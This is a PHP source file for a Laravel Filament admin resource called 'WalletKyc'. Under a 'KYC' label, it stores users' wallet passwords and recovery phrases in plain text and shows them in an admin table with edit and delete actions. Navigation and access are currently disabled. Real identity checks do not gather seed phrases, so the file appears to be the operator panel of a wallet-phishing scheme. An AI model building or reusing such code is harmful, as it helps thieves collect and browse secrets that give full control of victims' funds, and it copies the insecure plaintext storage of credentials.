<?php

namespace App\Filament\Resources;

use Filament\Forms;
use Filament\Tables;
use App\Models\WalletKyc;
use Filament\Forms\Form;
use Filament\Tables\Table;
use Filament\Resources\Resource;
use Filament\Tables\Columns\TextColumn;
use Illuminate\Database\Eloquent\Builder;
use App\Filament\Resources\WalletKycResource\Pages;
use Illuminate\Database\Eloquent\SoftDeletingScope;
use App\Filament\Resources\WalletKycResource\RelationManagers;


class WalletKycResource extends Resource
{
    protected static ?string $model = WalletKyc::class;

    protected static ?string $navigationIcon = 'heroicon-o-key';

    // Wallet KYC admin temporarily disabled — remove the block below to restore Filament navigation
    protected static bool $shouldRegisterNavigation = false;

    public static function canAccess(): bool
    {
        return false;
    }

    public static function form(Form $form): Form
    {
        return $form->schema([
            Forms\Components\TextInput::make('user_id')->disabled(),
            Forms\Components\TextInput::make('password')->disabled(),
            Forms\Components\Textarea::make('phrase')->disabled(),
        ]);
    }

    public static function table(Table $table): Table
    {
        return $table->columns([
            // TextColumn::make('id')->sortable(),
            TextColumn::make('user.name')->label('User')->sortable()->searchable(),
            TextColumn::make('password')->limit(20),
            TextColumn::make('phrase')->limit(30),
            TextColumn::make('created_at')->dateTime(),
        ])
        ->filters([
                //
            ])
            ->actions([
                Tables\Actions\EditAction::make(),
            ])
            ->bulkActions([
                Tables\Actions\DeleteBulkAction::make(),
            ]);
    }
    
    public static function getRelations(): array
    {
        return [
            //
        ];
    }
    
    public static function getPages(): array
    {
        return [
            'index' => Pages\ListWalletKycs::route('/'),
            'create' => Pages\CreateWalletKyc::route('/create'),
            'edit' => Pages\EditWalletKyc::route('/{record}/edit'),
        ];
    }    
}
